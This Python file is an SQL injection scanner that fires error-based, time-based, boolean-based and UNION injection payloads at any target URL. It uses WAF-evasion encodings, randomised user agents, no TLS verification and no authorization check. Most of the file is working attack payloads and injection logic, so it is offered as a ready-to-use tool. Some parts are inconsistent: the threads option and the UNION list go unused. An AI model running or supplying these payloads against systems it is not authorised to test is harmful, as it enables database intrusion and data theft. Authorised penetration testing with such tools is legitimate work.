#!/usr/bin/env python3
"""
SQL Injection Scanner Pro — Enterprise Edition
Deep SQLi detection with multiple injection vectors

Features:
- Error-based SQLi detection
- Time-based blind SQLi detection
- UNION-based SQLi detection
- Boolean-based blind SQLi detection
- Multiple DBMS payload support (MySQL, PostgreSQL, MSSQL, Oracle)
- WAF evasion techniques
"""

import os
import re
import json
import time
import random
import threading
from datetime import datetime, timezone
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
from queue import Queue, Empty

import requests

# Optional colors
try:
    from colorama import init, Fore, Style
    init(autoreset=True)
except Exception:
    class _C:
        def __getattr__(self, _): return ""
    Fore = Style = _C()

# Configuration
REQUEST_TIMEOUT = 15
DEFAULT_THREADS = 10
TIME_THRESHOLD = 5  # seconds for time-based detection

OUTPUT_BASE = os.path.join("reports", "sqli_scanner")
os.makedirs(OUTPUT_BASE, exist_ok=True)

# SQL Error patterns by DBMS
SQL_ERRORS = {
    "MySQL": [
        r"SQL syntax.*MySQL",
        r"Warning.*mysql_",
        r"MySqlException",
        r"valid MySQL result",
        r"check the manual that corresponds to your MySQL",
        r"MySqlClient\.",
        r"com\.mysql\.jdbc",
        r"Syntax error or access violation",
        r"SQLSTATE\[HY000\]",
    ],
    "PostgreSQL": [
        r"PostgreSQL.*ERROR",
        r"Warning.*\Wpg_",
        r"valid PostgreSQL result",
        r"Npgsql\.",
        r"PG::SyntaxError:",
        r"org\.postgresql\.util\.PSQLException",
        r"ERROR:\s+syntax error at or near",
    ],
    "MSSQL": [
        r"Driver.* SQL[\-\_\ ]*Server",
        r"OLE DB.* SQL Server",
        r"\[SQL Server\]",
        r"ODBC SQL Server Driver",
        r"SQLServer JDBC Driver",
        r"SqlException",
        r"Unclosed quotation mark after the character string",
        r"mssql_query\(\)",
        r"Microsoft SQL Native Client error",
    ],
    "Oracle": [
        r"ORA-[0-9]{4,}",
        r"Oracle error",
        r"Oracle.*Driver",
        r"Warning.*\Woci_",
        r"Warning.*\Wora_",
        r"quoted string not properly terminated",
    ],
    "SQLite": [
        r"SQLite/JDBCDriver",
        r"SQLite\.Exception",
        r"System\.Data\.SQLite\.SQLiteException",
        r"Warning.*sqlite_",
        r"Warning.*SQLite3::",
        r"\[SQLITE_ERROR\]",
    ],
}

# Error-based injection payloads
ERROR_PAYLOADS = [
    "'",
    "''",
    "`",
    "\"",
    "')",
    "\")",
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "' OR '1'='1' --",
    "' OR '1'='1' #",
    "1' ORDER BY 1--+",
    "1' ORDER BY 100--+",
    "' UNION SELECT NULL--",
    "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
    "1;SELECT SLEEP(5)#",
    "1);SELECT SLEEP(5)#",
]

# Time-based blind injection payloads
TIME_PAYLOADS = {
    "MySQL": [
        "' OR SLEEP({time})--",
        "' OR SLEEP({time})#",
        "1' AND SLEEP({time})--",
        "1' AND SLEEP({time})#",
        "1'; WAITFOR DELAY '0:0:{time}'--",
        "' OR BENCHMARK(10000000,SHA1('test'))--",
    ],
    "PostgreSQL": [
        "'; SELECT pg_sleep({time})--",
        "' OR pg_sleep({time})--",
        "1; SELECT pg_sleep({time})--",
    ],
    "MSSQL": [
        "'; WAITFOR DELAY '0:0:{time}'--",
        "' OR 1=1; WAITFOR DELAY '0:0:{time}'--",
        "1; WAITFOR DELAY '0:0:{time}'--",
    ],
}

# Union-based payloads
UNION_PAYLOADS = [
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
    "' UNION ALL SELECT NULL--",
    "' UNION ALL SELECT NULL,NULL--",
]

# Boolean-based payloads
BOOLEAN_PAYLOADS = [
    ("' AND '1'='1", "' AND '1'='2"),
    ("' AND 1=1--", "' AND 1=2--"),
    ("' OR '1'='1", "' OR '1'='2"),
    ("1 AND 1=1", "1 AND 1=2"),
]

# WAF bypass techniques
WAF_BYPASS = [
    lambda p: p,  # original
    lambda p: p.replace(" ", "/**/"),  # comment bypass
    lambda p: p.replace(" ", "%20"),  # URL encode space
    lambda p: p.replace(" ", "%09"),  # tab bypass
    lambda p: p.replace("'", "%27"),  # URL encode quote
    lambda p: p.replace("SELECT", "SeLeCt"),  # case variation
    lambda p: p.replace("UNION", "UnIoN"),
    lambda p: p.replace("OR", "||"),
    lambda p: p.replace("AND", "&&"),
]


def utc_now():
    return datetime.now(timezone.utc)


def random_headers():
    return {
        "User-Agent": random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
        ]),
        "Accept": "text/html,application/json,*/*",
        "Accept-Language": "en-US,en;q=0.9",
    }


def check_sql_errors(response_text):
    """Check response for SQL error messages"""
    findings = []
    for dbms, patterns in SQL_ERRORS.items():
        for pattern in patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                findings.append({"dbms": dbms, "pattern": pattern})
    return findings


def measure_response_time(session, url, method="GET", data=None):
    """Measure response time for time-based detection"""
    try:
        start = time.time()
        if method.upper() == "POST":
            session.post(url, data=data, headers=random_headers(), timeout=REQUEST_TIMEOUT + TIME_THRESHOLD, verify=False)
        else:
            session.get(url, headers=random_headers(), timeout=REQUEST_TIMEOUT + TIME_THRESHOLD, verify=False)
        return time.time() - start
    except:
        return -1


class SQLiScanner:
    def __init__(self, base_url, threads=DEFAULT_THREADS):
        self.base = base_url.rstrip("/")
        self.threads = threads
        self.session = requests.Session()
        self.findings = []
        self.lock = threading.Lock()

    def get_baseline(self, url):
        """Get baseline response for comparison"""
        try:
            resp = self.session.get(url, headers=random_headers(), timeout=REQUEST_TIMEOUT, verify=False)
            return {
                "status": resp.status_code,
                "length": len(resp.content),
                "time": resp.elapsed.total_seconds(),
                "text": resp.text[:5000],  # First 5KB for comparison
            }
        except:
            return None

    def test_error_based(self, url, param_name, original_value):
        """Test for error-based SQL injection"""
        findings = []
        
        for payload in ERROR_PAYLOADS:
            for bypass_fn in WAF_BYPASS[:3]:  # Use first 3 bypass techniques
                test_payload = bypass_fn(payload)
                test_url = self._inject_param(url, param_name, original_value + test_payload)
                
                try:
                    resp = self.session.get(test_url, headers=random_headers(), timeout=REQUEST_TIMEOUT, verify=False)
                    errors = check_sql_errors(resp.text)
                    
                    if errors:
                        findings.append({
                            "type": "error_based",
                            "url": test_url,
                            "parameter": param_name,
                            "payload": test_payload,
                            "dbms": errors[0]["dbms"],
                            "evidence": errors[0]["pattern"],
                            "severity": "CRITICAL",
                        })
                        return findings  # Found SQLi, no need to continue
                        
                except Exception as e:
                    continue
                    
        return findings

    def test_time_based(self, url, param_name, original_value):
        """Test for time-based blind SQL injection"""
        findings = []
        
        # Get baseline response time
        baseline_time = measure_response_time(self.session, url)
        if baseline_time < 0:
            return findings
            
        for dbms, payloads in TIME_PAYLOADS.items():
            for payload_template in payloads[:2]:  # Test first 2 payloads per DBMS
                payload = payload_template.format(time=TIME_THRESHOLD)
                test_url = self._inject_param(url, param_name, original_value + payload)
                
                response_time = measure_response_time(self.session, test_url)
                
                if response_time >= TIME_THRESHOLD and response_time > baseline_time + TIME_THRESHOLD - 1:
                    findings.append({
                        "type": "time_based_blind",
                        "url": test_url,
                        "parameter": param_name,
                        "payload": payload,
                        "dbms": dbms,
                        "evidence": f"Response delayed by {response_time:.2f}s (baseline: {baseline_time:.2f}s)",
                        "severity": "HIGH",
                    })
                    return findings
                    
        return findings

    def test_boolean_based(self, url, param_name, original_value):
        """Test for boolean-based blind SQL injection"""
        findings = []
        baseline = self.get_baseline(url)
        if not baseline:
            return findings
            
        for true_payload, false_payload in BOOLEAN_PAYLOADS:
            true_url = self._inject_param(url, param_name, original_value + true_payload)
            false_url = self._inject_param(url, param_name, original_value + false_payload)
            
            try:
                true_resp = self.session.get(true_url, headers=random_headers(), timeout=REQUEST_TIMEOUT, verify=False)
                false_resp = self.session.get(false_url, headers=random_headers(), timeout=REQUEST_TIMEOUT, verify=False)
                
                # Check for different responses indicating boolean injection
                if (len(true_resp.content) != len(false_resp.content) and 
                    abs(len(true_resp.content) - baseline["length"]) < 500):
                    findings.append({
                        "type": "boolean_based_blind",
                        "url": url,
                        "parameter": param_name,
                        "payload": f"true:{true_payload} false:{false_payload}",
                        "evidence": f"True response: {len(true_resp.content)} bytes, False response: {len(false_resp.content)} bytes",
                        "severity": "HIGH",
                    })
                    return findings
                    
            except:
                continue
                
        return findings

    def _inject_param(self, url, param_name, value):
        """Inject payload into URL parameter"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        params[param_name] = [value]
        new_query = urlencode(params, doseq=True)
        return f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"

    def scan_url(self, url):
        """Scan a single URL for SQLi"""
        findings = []
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if not params:
            # Try common parameter names
            common_params = ["id", "page", "user", "item", "product", "cat", "category", "search", "q"]
            for param in common_params:
                test_url = f"{url}?{param}=1"
                findings.extend(self.test_error_based(test_url, param, "1"))
                if not findings:
                    findings.extend(self.test_time_based(test_url, param, "1"))
        else:
            for param_name, values in params.items():
                original = values[0] if values else ""
                findings.extend(self.test_error_based(url, param_name, original))
                if not findings:
                    findings.extend(self.test_time_based(url, param_name, original))
                if not findings:
                    findings.extend(self.test_boolean_based(url, param_name, original))
                    
        return findings

    def run(self, endpoints=None):
        """Run the scanner"""
        if endpoints is None:
            endpoints = [
                self.base,
                f"{self.base}/api",
                f"{self.base}/search",
                f"{self.base}/user",
                f"{self.base}/product",
                f"{self.base}/item",
            ]
            
        all_findings = []
        for endpoint in endpoints:
            findings = self.scan_url(endpoint)
            all_findings.extend(findings)
            
        return all_findings


def main():
    import argparse
    parser = argparse.ArgumentParser(description="SQL Injection Scanner Pro")
    parser.add_argument("--target", "-t", required=True, help="Target URL")
    parser.add_argument("--threads", type=int, default=DEFAULT_THREADS, help="Number of threads")
    args = parser.parse_args()
    
    print(f"{Fore.CYAN}[*] SQL Injection Scanner Pro - Starting scan{Style.RESET_ALL}")
    print(f"{Fore.CYAN}[*] Target: {args.target}{Style.RESET_ALL}")
    
    scanner = SQLiScanner(args.target, threads=args.threads)
    findings = scanner.run()
    
    if findings:
        print(f"\n{Fore.RED}[!] Found {len(findings)} potential SQL injection vulnerabilities:{Style.RESET_ALL}")
        for f in findings:
            print(f"  - {f['type']}: {f['parameter']} ({f['severity']})")
    else:
        print(f"\n{Fore.GREEN}[+] No SQL injection vulnerabilities detected{Style.RESET_ALL}")
        
    # Save report
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    report_file = os.path.join(OUTPUT_BASE, f"sqli_report_{ts}.json")
    with open(report_file, "w") as f:
        json.dump({"target": args.target, "findings": findings, "timestamp": utc_now().isoformat()}, f, indent=2)
    print(f"\n{Fore.CYAN}[*] Report saved: {report_file}{Style.RESET_ALL}")


if __name__ == "__main__":
    main()
